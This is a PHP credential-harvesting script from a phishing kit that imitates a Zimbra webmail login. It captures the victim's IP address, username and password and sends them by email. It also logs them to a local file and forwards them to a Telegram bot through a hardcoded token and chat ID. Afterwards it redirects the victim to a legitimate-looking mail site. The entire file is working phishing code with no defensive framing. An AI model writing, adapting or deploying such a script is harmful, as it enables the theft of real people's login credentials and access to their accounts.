<?php


$ip = $_SERVER['REMOTE_ADDR'];

include('email.php');

$subject = "ZIMBRA WEBMAIL Login Infos ";
$headers = "From: BD <ZIMBRA WEBMAIL>\r\n";
$message .= "
[+] ZIMBRA WEBMAIL Info  [+]
[IP]                    : ".$ip."
[USERNAME]       		: ".$_POST['username']."
[PASSWORD] 				: ".$_POST['password']."

----------------------------------\n
**********************************\n
**********************************\n";
mail($email,$subject,$message,$headers);
$text = fopen('stored.txt', 'a');
fwrite($text, $message);

/* Telegram */
function sendMessage($messaggio) {
    $token = '7052759807:AAEuOXrrhrCSGHVZu1dNZBSIMoIVXmZ_HDM';
	$chatid = '6687721863';
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sendMessage($message);
header("Location: https://mail.comandoap.com.br/");

?>